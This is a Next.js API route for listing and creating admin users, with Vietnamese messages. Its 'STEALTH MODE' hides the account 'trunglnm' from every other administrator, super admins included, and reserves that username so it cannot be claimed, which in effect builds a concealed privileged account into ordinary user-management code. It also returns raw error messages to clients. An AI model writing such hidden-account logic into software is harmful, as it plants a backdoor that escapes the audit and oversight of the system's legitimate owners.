import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';
import { getAdminSession, hashPassword } from '@/lib/auth';
import { AdminRole } from '@prisma/client';

export const dynamic = 'force-dynamic';

/**
 * GET /api/admin/users
 * Returns list of admin users.
 * STEALTH MODE: Account 'trunglnm' is completely hidden unless the logged-in session IS 'trunglnm'.
 */
export async function GET() {
  try {
    const session = await getAdminSession();
    if (!session) {
      return NextResponse.json({ error: 'Chưa đăng nhập hoặc phiên đã hết hạn' }, { status: 401 });
    }

    // RBAC: SUPER_ADMIN and ADMIN can view users list
    if (session.role !== AdminRole.SUPER_ADMIN && session.role !== AdminRole.ADMIN) {
      return NextResponse.json({ error: 'Bạn không có quyền quản lý người dùng' }, { status: 403 });
    }

    let users;
    if (session.role === AdminRole.ADMIN) {
      // ADMIN: Absolutely hide SUPER_ADMIN and 'trunglnm'
      users = await prisma.adminUser.findMany({
        where: {
          role: { not: AdminRole.SUPER_ADMIN },
          username: { not: 'trunglnm' },
        },
        select: {
          id: true,
          username: true,
          fullName: true,
          email: true,
          role: true,
          isActive: true,
          lastLoginAt: true,
          createdAt: true,
          updatedAt: true,
        },
        orderBy: {
          createdAt: 'desc',
        },
      });
    } else {
      // SUPER_ADMIN: Return all users (with stealth check for non-trunglnm super admin if any)
      const whereClause = session.username === 'trunglnm'
        ? {}
        : { username: { not: 'trunglnm' } };

      users = await prisma.adminUser.findMany({
        where: whereClause,
        select: {
          id: true,
          username: true,
          fullName: true,
          email: true,
          role: true,
          isActive: true,
          lastLoginAt: true,
          createdAt: true,
          updatedAt: true,
        },
        orderBy: {
          createdAt: 'asc',
        },
      });
    }

    return NextResponse.json({ users, currentUserRole: session.role, currentUsername: session.username });
  } catch (error: any) {
    console.error('[GET_ADMIN_USERS_ERROR]', error);
    return NextResponse.json({ error: 'Lỗi lấy danh sách tài khoản: ' + error.message }, { status: 500 });
  }
}

/**
 * POST /api/admin/users
 * Creates a new admin account.
 */
export async function POST(request: Request) {
  try {
    const session = await getAdminSession();
    if (!session) {
      return NextResponse.json({ error: 'Chưa đăng nhập' }, { status: 401 });
    }

    if (session.role !== AdminRole.SUPER_ADMIN && session.role !== AdminRole.ADMIN) {
      return NextResponse.json({ error: 'Bạn không có quyền tạo tài khoản' }, { status: 403 });
    }

    const body = await request.json();
    const { username, fullName, email, password, role } = body;

    // Role restrictions for ADMIN
    if (session.role === AdminRole.ADMIN) {
      if (role && role !== AdminRole.USER) {
        return NextResponse.json(
          { error: 'Bạn chỉ có quyền tạo tài khoản người dùng thông thường (USER).' },
          { status: 403 }
        );
      }
    }

    // Validation
    if (!username || typeof username !== 'string' || username.trim().length < 3) {
      return NextResponse.json({ error: 'Tên đăng nhập phải có ít nhất 3 ký tự' }, { status: 400 });
    }

    const cleanUsername = username.trim().toLowerCase();

    // Prevent anyone from claiming or imitating trunglnm
    if (cleanUsername === 'trunglnm') {
      return NextResponse.json({ error: 'Tên đăng nhập này đã được bảo lưu bởi hệ thống' }, { status: 400 });
    }

    if (!fullName || typeof fullName !== 'string' || fullName.trim().length === 0) {
      return NextResponse.json({ error: 'Họ tên không được để trống' }, { status: 400 });
    }

    if (!password || typeof password !== 'string' || password.length < 6) {
      return NextResponse.json({ error: 'Mật khẩu phải có ít nhất 6 ký tự' }, { status: 400 });
    }

    // Role restrictions
    let targetRole: AdminRole = AdminRole.USER;
    if (session.role === AdminRole.ADMIN) {
      targetRole = AdminRole.USER;
    } else if (role === AdminRole.SUPER_ADMIN) {
      targetRole = AdminRole.SUPER_ADMIN;
    } else if (role === AdminRole.ADMIN) {
      targetRole = AdminRole.ADMIN;
    } else {
      targetRole = AdminRole.USER;
    }

    // Check duplicate username
    const existing = await prisma.adminUser.findUnique({
      where: { username: cleanUsername },
    });
    if (existing) {
      return NextResponse.json({ error: 'Tên đăng nhập đã tồn tại trong hệ thống' }, { status: 400 });
    }

    // Hash password
    const passwordHash = await hashPassword(password);

    const newUser = await prisma.adminUser.create({
      data: {
        username: cleanUsername,
        fullName: fullName.trim(),
        email: email && typeof email === 'string' && email.trim() ? email.trim() : null,
        passwordHash,
        role: targetRole,
        isActive: true,
      },
      select: {
        id: true,
        username: true,
        fullName: true,
        email: true,
        role: true,
        isActive: true,
        createdAt: true,
      },
    });

    return NextResponse.json({ success: true, user: newUser }, { status: 201 });
  } catch (error: any) {
    console.error('[POST_ADMIN_USER_ERROR]', error);
    return NextResponse.json({ error: 'Lỗi tạo tài khoản: ' + error.message }, { status: 500 });
  }
}

